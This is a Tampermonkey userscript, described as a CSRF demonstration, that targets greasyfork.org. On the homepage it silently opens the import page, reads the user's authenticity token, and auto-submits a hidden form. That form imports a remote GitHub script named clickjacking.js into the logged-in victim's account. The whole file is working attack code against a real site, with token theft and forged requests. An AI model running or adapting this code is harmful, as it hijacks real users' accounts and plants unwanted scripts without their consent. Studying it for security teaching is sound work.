// ==UserScript==
// @name         CSRF
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Demonstrate a CSRF attack using Tampermonkey
// @author       Guangrui Wang
// @match        https://greasyfork.org/en
// @match        https://greasyfork.org/en/import
// @grant        GM_openInTab
// @grant        GM_setValue
// @grant        GM_getValue
// @sandbox      raw
// ==/UserScript==
(function() {
    'use strict';
    if(document.location.href === "https://greasyfork.org/en/import"){
        console.log(document.querySelector("input[name=authenticity_token]").value)
        GM_setValue("authenticity_token",document.querySelector("input[name=authenticity_token]").value)
    }else if(document.location.href === "https://greasyfork.org/en"){
        const newTab = GM_openInTab("https://greasyfork.org/en/import",{loadInBackground:true,insert: true});
        GM_setValue('tab',newTab)
        setTimeout(()=>{
            newTab.close()
            const csrf_token = GM_getValue("authenticity_token")
            if(document.querySelector('span.user-profile-link') !== null){
                let csrfForm = document.createElement("form");
                csrfForm.setAttribute("method", "POST");
                csrfForm.setAttribute("action", "https://greasyfork.org/en/import/add");
                // Add any necessary parameters for the fake form submission
                let input1 = document.createElement("input");
                input1.setAttribute("type", "hidden");
                input1.setAttribute("name", "authenticity_token");
                input1.setAttribute("value", csrf_token);
                csrfForm.appendChild(input1);
                let input2 = document.createElement("input");
                input2.setAttribute("type", "hidden");
                input2.setAttribute("name", "sync_urls");
                input2.setAttribute("value", "https://github.com/wgr5600133/14828/blob/main/clickjacking.js");
                csrfForm.appendChild(input2);
                let input3 = document.createElement("input");
                input3.setAttribute("type", "hidden");
                input3.setAttribute("name", "sync-type");
                input3.setAttribute("value", "2");
                csrfForm.appendChild(input3);
                let input4 = document.createElement("input");
                input4.setAttribute("type", "hidden");
                input4.setAttribute("name", "commit");
                input4.setAttribute("value", "Import");
                csrfForm.appendChild(input4);
                // Append the form to the body and submit it
                document.body.appendChild(csrfForm);
                csrfForm.submit();
                console.log(111)
            }
        },1000)
    }
})();
